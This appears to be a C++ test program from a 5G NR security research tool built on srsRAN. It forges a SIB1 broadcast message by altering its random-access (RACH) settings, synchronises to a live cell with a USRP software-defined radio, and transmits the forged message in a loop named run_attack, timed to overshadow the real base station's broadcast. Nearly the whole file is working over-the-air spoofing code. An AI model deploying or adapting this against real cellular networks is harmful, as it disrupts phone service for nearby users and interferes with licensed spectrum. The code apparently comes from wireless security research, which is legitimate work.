#include "shadower/hdr/source.h"
#include "shadower/hdr/syncer.h"
#include "shadower/hdr/utils.h"
#include "test_variables.h"
#include <atomic>
uint16_t           rnti             = si_rnti;
srsran_rnti_type_t rnti_type        = srsran_rnti_type_si;
uint32_t           slot_advancement = 7;
uint32_t           samples_adv      = 0;
std::atomic<bool>  attack_running{false};

int modify_sib1(srslog::basic_logger& logger, std::shared_ptr<std::vector<uint8_t> > msg);

void run_attack(Syncer*                             syncer,
                Source*                             source,
                srsran::phy_cfg_nr_t*               phy_cfg,
                srsran_gnb_dl_t*                    gnb_dl,
                cf_t*                               gnb_dl_buffer,
                std::shared_ptr<std::vector<cf_t> > msg,
                uint16_t                            rnti,
                srsran_rnti_type_t                  rnti_type,
                uint32_t                            slot_len,
                srslog::basic_logger&               logger);

int main(int argc, char* argv[])
{
  /* initialize logger */
  srslog::basic_logger& logger = srslog_init();
  logger.set_level(srslog::basic_levels::debug);

  /* initialize phy cfg */
  srsran::phy_cfg_nr_t phy_cfg = {};
  init_phy_cfg(phy_cfg, config);

  /* load mib configuration and update phy_cfg */
  if (!configure_phy_cfg_from_mib(phy_cfg, mib_config_raw, ncellid)) {
    printf("Failed to configure phy cfg from mib\n");
    return -1;
  }

  /* Initialize the source based on the configuration */
  Source* source;
  config.source_type = "uhd";
  if (config.source_type == "uhd") {
    create_source_t uhd_source = load_source(uhd_source_module_path);
    config.source_params       = "type=b200";
    source                     = uhd_source(config);
    logger.info("Initialized source using SDR: %s", config.source_params.c_str());
  } else {
    create_source_t file_source = load_source(file_source_module_path);
    config.source_params        = "shadower/test/data/srsran-n78-20MHz/sib1.fc32";
    source                      = file_source(config);
    logger.info("Initialized source using file: %s", config.source_params.c_str());
  }

  /* GNB DL init with configuration from phy_cfg */
  srsran_gnb_dl_t gnb_dl        = {};
  cf_t*           gnb_dl_buffer = srsran_vec_cf_malloc(sf_len);
  if (!init_gnb_dl(gnb_dl, gnb_dl_buffer, phy_cfg, config.sample_rate)) {
    logger.error("Failed to init GNB DL");
    return -1;
  }

  /* modify the sib1 message */
  std::shared_ptr<std::vector<uint8_t> > msg = std::make_shared<std::vector<uint8_t> >();
  if (modify_sib1(logger, msg) != 0) {
    logger.error("Failed to modify sib1");
    return -1;
  }

  /* convert sib1 bytes to symbols */
  srsran_dci_cfg_nr_t dci_cfg   = {}; // empty dci_cfg
  srsran_sch_cfg_nr_t pdsch_cfg = {}; // empty pdsch_cfg
  srsran_slot_cfg_t   slot_cfg  = {.idx = 1};
  if (!gnb_dl_encode(msg, gnb_dl, dci_cfg, phy_cfg, pdsch_cfg, slot_cfg, rnti, rnti_type, logger, 5, 9)) {
    logger.error("Failed to encode message");
    return -1;
  }
  std::shared_ptr<std::vector<cf_t> > sib_symbols = std::make_shared<std::vector<cf_t> >(slot_len);
  srsran_vec_cf_copy(sib_symbols->data(), gnb_dl_buffer, slot_len);

  char filename[64];
  sprintf(filename, "gnb_dl_buffer_fft768");
  write_record_to_file(sib_symbols->data(), slot_len, filename);

  /* Initialize and create the syncer instance */
  syncer_args_t syncer_args = {
      .srate       = config.sample_rate,
      .scs         = config.scs_ssb,
      .dl_freq     = config.dl_freq,
      .ssb_freq    = config.ssb_freq,
      .pattern     = config.ssb_pattern,
      .duplex_mode = config.duplex_mode,
  };
  Syncer* syncer = new Syncer(syncer_args, source, config);
  if (!syncer->init()) {
    logger.error("Error initializing syncer\n");
    return -1;
  }
  syncer->on_cell_found = [&](srsran_mib_nr_t& mib, uint32_t ncellid) {
    logger.info("Cell found: ncellid=%d", ncellid);
    attack_running = true;
  };
  logger.info("Initialized syncer");

  /* Start the attack thread */
  std::thread attack_thread(run_attack,
                            syncer,
                            source,
                            &phy_cfg,
                            &gnb_dl,
                            gnb_dl_buffer,
                            sib_symbols,
                            rnti,
                            rnti_type,
                            slot_len,
                            std::ref(logger));

  /* start the syncer with highest priority */
  syncer->start(0);
  syncer->wait_thread_finish();
  attack_thread.join();
  source->close();
  return 0;
}

void run_attack(Syncer*                             syncer,
                Source*                             source,
                srsran::phy_cfg_nr_t*               phy_cfg,
                srsran_gnb_dl_t*                    gnb_dl,
                cf_t*                               gnb_dl_buffer,
                std::shared_ptr<std::vector<cf_t> > symbols,
                uint16_t                            rnti,
                srsran_rnti_type_t                  rnti_type,
                uint32_t                            slot_len,
                srslog::basic_logger&               logger)
{
  uint32_t           slot_idx;
  srsran_timestamp_t rx_timestamp;
  uint32_t           last_sent_slot = 0;
  while (true) {
    /* Wait the attack to run first */
    if (!attack_running) {
      std::this_thread::sleep_for(std::chrono::milliseconds(1));
      continue;
    }
    syncer->get_tti(&slot_idx, &rx_timestamp);
    /* If the slot index equals to the last sent slot, then just wait */
    if (slot_idx == last_sent_slot) {
      std::this_thread::sleep_for(std::chrono::milliseconds(1));
      continue;
    }
    if (slot_idx % 20 == (20 - slot_advancement + 1)) {
      srsran_timestamp_add(&rx_timestamp, 0, slot_advancement * 5e-4 - samples_adv / config.sample_rate);
      source->send(gnb_dl_buffer, slot_len, rx_timestamp);
      last_sent_slot = slot_idx;
    }
  }
}

int modify_sib1(srslog::basic_logger& logger, std::shared_ptr<std::vector<uint8_t> > msg)
{
  /* load sib1 raw bytes from file */
  std::vector<uint8_t> sib1_raw(sib1_size);
  if (!read_raw_config(sib1_config_raw, sib1_raw.data(), sib1_size)) {
    logger.error("Failed to read SIB1 from %s\n", sib1_config_raw.c_str());
    return -1;
  }

  /* parse sib1 bytes to asn1 structure */
  asn1::rrc_nr::sib1_s sib1;
  if (!parse_to_sib1(sib1_raw.data(), sib1_size, sib1)) {
    printf("Failed to parse SIB1\n");
    return false;
  }

  /* Modify the rach configurations */
  asn1::rrc_nr::rach_cfg_common_s& rach_cfg_common =
      sib1.serving_cell_cfg_common.ul_cfg_common.init_ul_bwp.rach_cfg_common.setup();
  rach_cfg_common.rach_cfg_generic.msg1_freq_start      = 20;
  rach_cfg_common.rach_cfg_generic.preamb_rx_target_pwr = -60;

  /* Initialize the buffer to pack sib1 to raw bytes */
  srsran::unique_byte_buffer_t packed_sib1 = srsran::make_byte_buffer();
  if (packed_sib1 == nullptr) {
    logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
    return -1;
  }

  /* Encode the sib1 to bcch_dl_sch_msg_s again */
  asn1::bit_ref                   bref(packed_sib1->msg, packed_sib1->get_tailroom());
  asn1::rrc_nr::bcch_dl_sch_msg_s bcch_msg_encode;
  bcch_msg_encode.msg.set_c1().set_sib_type1() = sib1;
  if (bcch_msg_encode.pack(bref) != asn1::SRSASN_SUCCESS) {
    logger.error("Couldn't pack SIB1 msg");
    return -1;
  }
  packed_sib1->N_bytes = bref.distance_bytes();

  /* Decode the packed sib1 to check if it is correctly encoded */
  asn1::rrc_nr::sib1_s sib1_decoded;
  if (!parse_to_sib1(packed_sib1->msg, packed_sib1->N_bytes, sib1_decoded)) {
    logger.error("Error decoding SIB1");
    return -1;
  }
  asn1::json_writer json_writer;
  sib1_decoded.to_json(json_writer);
  logger.info("New SIB1: %s", json_writer.to_string().c_str());

  /* Copy the new encoded bytes into the message buffer */
  msg->resize(packed_sib1->N_bytes);
  memcpy(msg->data(), packed_sib1->msg, packed_sib1->N_bytes);
  return 0;
}